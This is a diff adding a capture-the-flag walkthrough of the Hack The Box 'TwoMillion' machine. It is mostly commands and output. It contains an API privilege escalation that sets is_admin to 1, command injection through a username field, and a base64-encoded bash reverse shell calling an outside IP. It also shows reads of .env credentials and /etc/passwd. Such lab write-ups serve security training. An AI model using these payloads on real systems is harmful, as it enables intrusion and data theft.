@@ -1,0 +1,285 @@
+---
+title: TwoMillion
+banner: /avatars/two-million.webp
+difficulty: easy
+os: linux
+releaseDate: 2023-06-07
+slug: "two-million"
+---
+
+## Enumeration
+
+```bash
+nmap -p- -n -Pn --disable-arp-ping -sS -sV -sC -vvv -T5 10.10.11.221 -oN twoMillion.nmap
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack ttl 63 nginx
+```
+
+<br/>
+
+```bash
+echo "10.10.11.221 2million.htb" | sudo tee -a /etc/hosts
+```
+
+```html
+<script src="/js/htb-frontend.min.js"></script>
+<script defer src="/js/inviteapi.min.js"></script>
+<script defer>
+	$(document).ready(function() {
+		$('#verifyForm').submit(function(e) {
+			e.preventDefault();
+			var code = $('#code').val();
+			var formData = { "code": code };
+			$.ajax({
+				type: "POST",
+				dataType: "json",
+				data: formData,
+				url: '/api/v1/invite/verify',
+				success: function(response) {
+					if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
+						// Store the invite code in localStorage
+						localStorage.setItem('inviteCode', code);
+						window.location.href = '/register';
+					} else {
+						alert("Invalid invite code. Please try again.");
+					}
+				},
+				error: function(response) {
+					alert("An error occurred. Please try again.");
+				}
+			});
+		});
+	});
+</script>
+```
+
+```javascript
+function verifyInviteCode(code) {
+    var formData = {
+        "code": code
+    };
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        data: formData,
+        url: '/api/v1/invite/verify',
+        success: function (response) {
+            console.log(response)
+        },
+        error: function (response) {
+            console.log(response)
+        }
+    })
+}
+
+function makeInviteCode() {
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        url: '/api/v1/invite/how/to/generate',
+        success: function (response) {
+            console.log(response)
+        },
+        error: function (response) {
+            console.log(response)
+        }
+    })
+}
+```
+
+```bash
+curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq
+```
+
+```bash
+curl -sX POST http://2million.htb/api/v1/invite/generate | jq
+```
+
+```bash
+echo U1oyN0ktUTVaOVMtREtOSVgtUDNDU00= | base64 -d
+
+2GK8M-R6Q5F-3PSE1-3F6VO
+```
+
+```txt
+GET /api/v1/user/vpn/generate HTTP/1.1
+Host: 2million.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://2million.htb/home/access
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=nufb0km8892s1t9kraqhqiecj6
+Upgrade-Insecure-Requests: 1
+```
+
+```bash
+curl -v 2million.htb/api
+```
+
+```bash
+curl -sv 2million.htb/api --cookie "PHPSESSID=cp7u0jf33357c8jjb5k9v4m0ir" | jq
+```
+
+```bash
+curl http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=eovcsv8bn94rokcpvu0to86hro" | jq
+```
+
+```bash
+curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=eovcsv8bn94rokcpvu0to86hro"
+```
+
+```bash
+curl -svX PUT http://2million.htb/api/v1/admin/settings/update --cookie
+"PHPSESSID=eovcsv8bn94rokcpvu0to86hro" | jq
+```
+
+```json
+curl -sX PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=eovcsv8bn94rokcpvu0to86hro" --header "Content-Type: application/json" | jq 
+
+{
+  "status": "danger",
+  "message": "Missing parameter: email"
+}
+```
+
+```json
+curl -sX PUT http://2million.htb/api/v1/admin/settings/update --cookie
+"PHPSESSID=eovcsv8bn94rokcpvu0to86hro" --header "Content-Type: application/json" --data '{"email":"example@2million.htb"}' | jq 
+
+{
+  "status": "danger",
+  "message": "Missing parameter: is_admin"
+}
+```
+
+```json
+curl -sX PUT http://2million.htb/api/v1/admin/settings/update --cookie
+"PHPSESSID=eovcsv8bn94rokcpvu0to86hro" --header "Content-Type: application/json" --data '{"email":"example@2million.htb", "is_admin": 1}' | jq
+
+{
+  "id": 13,
+  "username": "example",
+  "is_admin": 1
+}
+```
+
+## Foothold
+
+```
+curl -sX POST http://2million.htb/api/v1/admin/vpn/generate --cookie
+"PHPSESSID=eovcsv8bn94rokcpvu0to86hro" --header "Content-Type: application/json" | jq
+
+{
+"status": "danger",
+"message": "Missing parameter: username"
+}
+```
+
+```
+curl -sX POST http://2million.htb/api/v1/admin/vpn/generate --cookie
+"PHPSESSID=eovcsv8bn94rokcpvu0to86hro" --header "Content-Type: application/json" --data '{"username":"test"}'
+
+client
+dev tun
+proto udp
+remote edge-eu-release-1.hackthebox.eu 1337
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+remote-cert-tls server
+comp-lzo
+verb 3
+data-ciphers-fallback AES-128-CBC
+data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
+tls-cipher "DEFAULT:@SECLEVEL=0"
+auth SHA256
+key-direction 1
+<ca>
+-----BEGIN CERTIFICATE-----
+MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL
+<SNIP>
+```
+
+```
+curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data '{"username":"test;id;"}'
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+```
+nc -lnvp 5000
+```
+
+```
+sh -i >& /dev/tcp/10.10.14.37/5000 0>&1
+```
+
+```
+echo "sh -i >& /dev/tcp/10.10.14.37/5000 0>&1" | base64
+
+c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzcvNTAwMCAwPiYxCg==
+```
+
+```
+curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie
+"PHPSESSID=eovcsv8bn94rokcpvu0to86hro" --header "Content-Type: application/json" --data '{"username":"test;echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzcvNTAwMCAwPiYxCg== | base64 -d | bash;"}'
+```
+
+## Post Exploitation
+
+```bash
+script /dev/null -c bash
+```
+
+`ctrl+z`
+
+<br/>
+
+```bash
+stty raw -echo; fg
+```
+
+<br/>
+
+```bash
+reset xterm
+```
+
+<br/>
+
+```bash
+export TERM=xterm
+```
+
+## Lateral Movement
+
+```
+www-data@2million:/var/www/html$ cat .env
+
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
+```
+
+```
+cat /etc/passwd
+<SNIP>
+admin:x:1000:1000::/home/admin:/bin/bash
+memcache:x:115:121:Memcached,,,:/nonexistent:/bin/false
+```
+
+```bash
+ssh admin@2million.htb
+```
+
+## Privilege Escalation
+
+## Extra
